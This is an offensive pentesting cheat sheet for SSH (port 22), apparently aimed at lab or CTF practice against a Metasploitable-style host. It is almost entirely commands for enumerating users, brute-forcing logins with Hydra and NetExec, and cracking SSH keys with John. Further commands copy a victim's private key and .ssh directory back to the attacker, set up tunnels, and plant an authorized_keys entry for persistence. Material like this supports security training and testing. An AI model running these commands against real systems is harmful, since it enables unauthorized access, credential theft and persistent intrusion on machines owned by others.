# Port 22 - SSH

## Table of Contents
- [Enumeration](#enumeration)
    - [Legacy Algorithms](#legacy-algorithms)
    - [Old Kex](#old-kex)
    - [Private Key](#private-key)
    - [File Transfer](#file-transfer)
- [BruteForce](#brute-force)

### Enumeration

#### Legacy Algorithms

```shell
ssh -o "HostKeyAlgorithms=+ssh-rsa" -o "PubkeyAcceptedAlgorithms=+ssh-rsa" user@$rhost
```

#### Old Kex

```shell
ssh -o "KexAlgorithms=+diffie-hellman-group1-sha1" -o "HostKeyAlgorithms=+ssh-rsa" user@$rhost
```

#### Private Key

```shell
chmod 600 id_rsa 
ssh -i ~/.ssh/id_rsa user@$rhost
```

-  Public SSH key

    ```shell
    ssh-keyscan -t rsa $rhost -p $port
    ```

#### File Transfer

- Attacker to Victim

    ```shell
    scp -o HostKeyAlgorithms=+ssh-rsa -O ./linpease msfadmin@192.168.2.147:/tmp/
    ```

- Victim to Attacker

    - Single file

        ```shell
        scp -o "KexAlgorithms=+diffie-hellman-group1-sha1" -o "HostKeyAlgorithms=+ssh-rsa" msfadmin@192.168.2.147:/home/msfadmin/.ssh/id_rsa .
        ```

    - Directory

        ```shell
        scp -o "KexAlgorithms=+diffie-hellman-group1-sha1" -o "HostKeyAlgorithms=+ssh-rsa" -r msfadmin@192.168.2.147:/home/msfadmin/.ssh/ .
        ```


### Banner Grabbing

```shell
# Using netcat
nc -vn $rhost 22

# SSH audit
ssh-audit $rhost
```

### Nmap Scripts

```shell
# Identify authentication methods
nmap --script ssh-auth-methods --script-args="ssh.user=username" -p 22 $rhost

# SSH hostkey
nmap --script ssh-hostkey -p 22 $rhost
```

### Metasploit User Enumeration

```shell
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS $rhost
set USER_FILE users.txt
run
```

---

### Brute force

#### NetExec

```shell
nxc ssh $rhost -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt --threads 10
```

#### Hydra

```shell
hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://$rhost
```

### SSH Key Cracking

```shell
/usr/share/john/ssh2john.py id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

### Post-Exploitation

#### SSH Tunneling

```shell
# Local port forwarding
ssh -L localPort:remoteHost:remotePort user@$rhost

# Remote port forwarding  
ssh -R remotePort:localHost:localPort user@$rhost

# Dynamic SOCKS proxy
ssh -D 8080 user@$rhost
```

#### Persistence

```shell
echo your_public_key >> ~/.ssh/authorized_keys
```




